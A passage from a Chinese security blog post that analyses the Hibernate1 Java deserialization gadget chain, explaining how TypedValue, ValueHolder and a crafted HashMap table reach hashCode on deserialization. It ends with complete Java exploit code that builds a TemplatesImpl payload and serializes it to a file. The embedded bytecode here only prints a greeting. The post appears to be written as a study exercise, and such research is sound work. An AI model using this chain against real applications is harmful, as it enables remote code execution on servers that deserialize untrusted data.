<pre><code>请教了公司的大佬是因为直接调用initTransients方法时，其目的只是给this.hashcode做一个方法的声明，并不会调用内部类中的initialize方法，只有在hashcode初始化时，才会调用内部类的方法。所以要看哪里使用了this.hashcode。</code></pre><p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804092537770.png" alt="image-20210804092537770"></p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804092623949.png" alt="image-20210804092623949"></p>
<p>​        所以这就是不能直接构造TypedValue对象进行反序列化利用的原因。但我们要继续构造，需要构造一个ValueHolder对象，给value的属性值赋值为null，给<code>this.valueInitializer</code>赋值为我们构造好的typevalue。ValueHolder可以直接通过构造方法构造并给valueInitializer赋值。直接new即可<code>ValueHolder hod= new ValueHolder(vaule);</code></p>
<p>​        得到ValueHolder后，还需要将ValueHolder的内容赋给TypeValue的hashcode属性。所以要再构建一个TypeValue对象并给hashcode赋值。由于TypeValue不能直接通过构造方法给hashcode赋值，所以我们还是通过ReflectionFactory先得到TypeValue对象，再通过反射给hashcode属性赋值。</p>
<p>​        但是实际调用会有一些问题，当我们直接通过new创建ValueHolder对象时，并不会调用上面的方法，因为参数需要的是实现了DeferedInitializer接口的类。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804095959564.png" alt="image-20210804095959564"></p>
<p>​        所以使用下面的方式可以创建一个ValueHolder对象，initTransients再反序列化时会被调用，因此不用我们手动去创建ValueHolder对象。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804100326653.png" alt="image-20210804100326653"></p>
<p>​        所以其实没有那么麻烦，直接调用TypeValue的hashcode就可以将利用链倒上去。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804100657981.png" alt="image-20210804100657981"></p>
<p>​        下面分析怎么调到hashCode方法。我们回想下urldns利用链，最终就导向了URL.hashCode()，调用链如下。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804100855535.png" alt="image-20210804100855535"></p>
<p>​        先看看<code>java.util.HashMap#hash</code>，想要调用成功，我们需要让key的值为TypedValue。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804101049350.png" alt="image-20210804101049350"></p>
<p>​        下面时给key赋值，通过put方法即可。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804101552787.png" alt="image-20210804101552787"></p>
<p>​        最后我们看下HashMap的readObject方法，实际上时调用hash方法触发漏洞的。所以只要给HashMap一个key即可。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804102729512.png" alt="image-20210804102729512"></p>
<p>​        但不能直接通过put方法给key赋值，因为put本身就会调用hash方法并执行代码。所以可以通过hashcode的内部类Node的构造方法给key赋值。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804105725280.png" alt="image-20210804105725280"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz5 = Class.forName(<span class="string">"java.util.HashMap$Node"</span>);</span><br><span class="line">       Constructor nodeCons = clazz.getDeclaredConstructor(<span class="keyword">int</span><span class="class">.<span class="keyword">class</span>, <span class="title">Object</span>.<span class="title">class</span>, <span class="title">Object</span>.<span class="title">class</span>, <span class="title">clazz5</span>)</span>;</span><br><span class="line">       nodeCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       nodeCons.newInstance(<span class="number">2</span>,value,value,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>​        下面我们要将构造好的Node对象赋值给HashMap的某个属性即可，好像只有table属性接收Node对象，但table是transient修饰的，也就是说默认不会进行序列化这个字段。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804111256075.png" alt="image-20210804111256075"></p>
<p>​        但在writeObject中调用的internalWriteEntries中会遍历table并将其中的key和value进行序列化。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804111354621.png" alt="image-20210804111354621"></p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804111502423.png" alt="image-20210804111502423"></p>
<p>​        由于table需要的是Node的数组类型，因此还需要创建一个数组对Node进行封装。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object tbl = Array.newInstance(clazz5,<span class="number">1</span>);</span><br><span class="line">Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">2</span>,value,value,<span class="keyword">null</span>));</span><br><span class="line">Field key=map.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">key.set(map,tbl);</span><br></pre></td></tr></table></figure>

<p>​        但是这么做反序列化会有异常，因为我们没有给hashmap设置长度。所以还要给hashmap设置size属性。这个我就直接调用ysoserial自带的Reflections来进行设置了。<code>Reflections.setFieldValue(map, &quot;size&quot;, 1);</code>.</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210804113152095.png" alt="image-20210804113152095"></p>
<p>​        总体的测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.weaver.ast.Test;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.internal.util.ValueHolder;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.mapping.Component;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.property.BasicPropertyAccessor;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.tuple.component.AbstractComponentTuplizer;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.tuple.component.PojoComponentTuplizer;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.ComponentType;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TempImplTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        String clazzName = <span class="string">"test666"</span>;</span><br><span class="line">        CtClass targetClass = pool.makeClass(clazzName);</span><br><span class="line">        targetClass.setSuperclass(pool.get(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>));</span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[] &#123;&#125;, targetClass);</span><br><span class="line">        cons.setBody(<span class="string">"&#123;System.out.println(\"Hello World!!!\");&#125;"</span>);</span><br><span class="line">        targetClass.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteArray = targetClass.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] b= &#123;byteArray&#125;;</span><br><span class="line">        Class&lt;TemplatesImpl&gt; clazz = (Class&lt;TemplatesImpl&gt;) Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        Constructor&lt;TemplatesImpl&gt; con =  clazz.getDeclaredConstructor(<span class="keyword">byte</span>[][]<span class="class">.<span class="keyword">class</span>,<span class="title">String</span>.<span class="title">class</span>, <span class="title">Properties</span>.<span class="title">class</span>,<span class="title">int</span>.<span class="title">class</span>, <span class="title">TransformerFactoryImpl</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line">        Method method=clazz.getMethod(<span class="string">"getOutputProperties"</span>);</span><br><span class="line">        <span class="keyword">int</span> a=<span class="number">2</span>;</span><br><span class="line">        TemplatesImpl impl=  con.newInstance(b,<span class="string">"xxx"</span>,pro,a,TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        Class&lt;BasicPropertyAccessor.BasicGetter&gt; clazz2 = (Class&lt;BasicPropertyAccessor.BasicGetter&gt;) Class.forName(<span class="string">"org.hibernate.property.BasicPropertyAccessor$BasicGetter"</span>);</span><br><span class="line">        Constructor&lt;BasicPropertyAccessor.BasicGetter&gt; con2 =  clazz2.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Method</span>.<span class="title">class</span>,<span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        con2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        BasicPropertyAccessor.BasicGetter getter= con2.newInstance(clazz,method,<span class="string">"OutputProperties"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        getter.get(impl);</span></span><br><span class="line"></span><br><span class="line">        Class&lt;PojoComponentTuplizer&gt; clazz3 = (Class&lt;PojoComponentTuplizer&gt;) Class.forName(<span class="string">"org.hibernate.tuple.component.PojoComponentTuplizer"</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz3,  Object.class.getConstructor(new Class[0]));</span><br><span class="line">        PojoComponentTuplizer pojo= (PojoComponentTuplizer) sc.newInstance(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        Class&lt;AbstractComponentTuplizer&gt; clazz4 = (Class&lt;AbstractComponentTuplizer&gt;) Class.forName(<span class="string">"org.hibernate.tuple.component.AbstractComponentTuplizer"</span>);</span><br><span class="line">        Field getters=clazz4.getDeclaredField(<span class="string">"getters"</span>);</span><br><span class="line">        getters.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        BasicPropertyAccessor.BasicGetter[] gets=&#123;getter&#125;;</span><br><span class="line">        getters.set(pojo,gets);</span><br><span class="line"><span class="comment">//        pojo.getPropertyValue(impl,0);</span></span><br><span class="line">        Class&lt;ComponentType&gt; CompType = (Class&lt;ComponentType&gt;) Class.forName(<span class="string">"org.hibernate.type.ComponentType"</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc2 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(CompType,  Object.class.getConstructor(new Class[0]));</span><br><span class="line">        ComponentType comp= (ComponentType) sc2.newInstance(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        Field compTuplizer=CompType.getDeclaredField(<span class="string">"componentTuplizer"</span>);</span><br><span class="line">        compTuplizer.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        compTuplizer.set(comp,pojo);</span><br><span class="line">        Field propSpan=CompType.getDeclaredField(<span class="string">"propertySpan"</span>);</span><br><span class="line">        propSpan.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        propSpan.set(comp,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        comp.getHashCode(impl);</span></span><br><span class="line">        TypedValue value=<span class="keyword">new</span> TypedValue(comp,impl);</span><br><span class="line"><span class="comment">//        vaule.hashCode();</span></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Reflections.setFieldValue(map, <span class="string">"size"</span>, <span class="number">1</span>);</span><br><span class="line">        Class clazz5 = Class.forName(<span class="string">"java.util.HashMap$Node"</span>);</span><br><span class="line">        Constructor nodeCons = clazz5.getDeclaredConstructor(<span class="keyword">int</span><span class="class">.<span class="keyword">class</span>, <span class="title">Object</span>.<span class="title">class</span>, <span class="title">Object</span>.<span class="title">class</span>, <span class="title">clazz5</span>)</span>;</span><br><span class="line">        nodeCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object tbl = Array.newInstance(clazz5,<span class="number">1</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">2</span>,value,value,<span class="keyword">null</span>));</span><br><span class="line">        Field key=map.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(map,tbl);</span><br><span class="line"></span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> FileOutputStream(<span class="string">"d:\\test.ser"</span>);</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(map);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"d:\\test.ser"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        这个利用链是我第一次尝试去自己构造exp的链，从中也学到了很多东西，相信下次再分析其他利用链会更加容易理解吧。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/反序列化/">反序列化</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>